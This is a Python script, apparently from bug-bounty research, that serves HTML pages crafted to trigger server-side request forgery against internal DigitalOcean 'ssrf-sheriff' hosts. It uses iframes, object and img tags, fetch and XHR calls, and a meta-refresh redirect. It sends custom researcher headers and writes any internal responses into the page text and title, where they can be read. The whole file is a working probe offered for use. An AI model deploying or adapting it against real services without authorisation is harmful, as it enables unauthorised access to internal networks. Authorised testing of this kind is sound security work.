import http.server
import socketserver

MAIN_HTML = """<!DOCTYPE html>
<html>
<head><title>SSRF Sheriff Results</title></head>
<body>
<h1>SSRF Sheriff Probe Page</h1>
<p>This page contains iframes and objects that load internal DigitalOcean endpoints.</p>

<h2>Sheriff iframes:</h2>
<iframe src="https://ssrf-sheriff.internal.digitalocean.com/" width="100%%" height="300"></iframe>
<iframe src="https://ssrf-sheriff.s2r1.internal.digitalocean.com/" width="100%%" height="300"></iframe>
<iframe src="https://ssrf-sheriff.internal.digitalocean.com/?researcher=oxship" width="100%%" height="300"></iframe>
<iframe src="https://ssrf-sheriff.s2r1.internal.digitalocean.com/?researcher=oxship" width="100%%" height="300"></iframe>

<h2>Object embeds:</h2>
<object data="https://ssrf-sheriff.internal.digitalocean.com/" width="100%%" height="200"></object>
<object data="https://ssrf-sheriff.s2r1.internal.digitalocean.com/" width="100%%" height="200"></object>

<h2>Image tags (will fail but trigger request):</h2>
<img src="https://ssrf-sheriff.internal.digitalocean.com/" onerror="this.alt='Request sent'" />
<img src="https://ssrf-sheriff.s2r1.internal.digitalocean.com/" onerror="this.alt='Request sent'" />

<h2>JS Fetch Results:</h2>
<pre id="r">Loading...</pre>
<script>
(async function(){
    var out = "";
    var urls = [
        "https://ssrf-sheriff.internal.digitalocean.com/",
        "https://ssrf-sheriff.s2r1.internal.digitalocean.com/"
    ];
    for (var u of urls) {
        try {
            var r = await fetch(u, {headers:{"X-BBP-Researcher":"oxship"}});
            out += u + " (cors): " + await r.text() + "\\n";
        } catch(e) {
            out += u + " (cors err): " + e + "\\n";
        }
        try {
            var r2 = await fetch(u, {mode:"no-cors"});
            out += u + " (no-cors): opaque response sent\\n";
        } catch(e2) {
            out += u + " (no-cors err): " + e2 + "\\n";
        }
    }
    // Also try XHR
    for (var u of urls) {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", u, false);
            xhr.setRequestHeader("X-BBP-Researcher", "oxship");
            xhr.send();
            out += u + " (xhr): " + xhr.responseText + "\\n";
        } catch(e3) {
            out += u + " (xhr err): " + e3 + "\\n";
        }
    }
    document.getElementById("r").textContent = out;
    document.title = "Results: " + out.substring(0, 200);
})();
</script>
</body>
</html>"""

REDIRECT_HTML = """<!DOCTYPE html>
<html>
<head>
<meta http-equiv="refresh" content="0; url=https://ssrf-sheriff.internal.digitalocean.com/">
</head>
<body>Redirecting to SSRF Sheriff...</body>
</html>"""

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        if self.path == "/redirect":
            self.wfile.write(REDIRECT_HTML.encode())
        else:
            self.wfile.write(MAIN_HTML.encode())

with socketserver.TCPServer(("0.0.0.0", 8080), Handler) as s:
    print("Serving on 8080", flush=True)
    s.serve_forever()
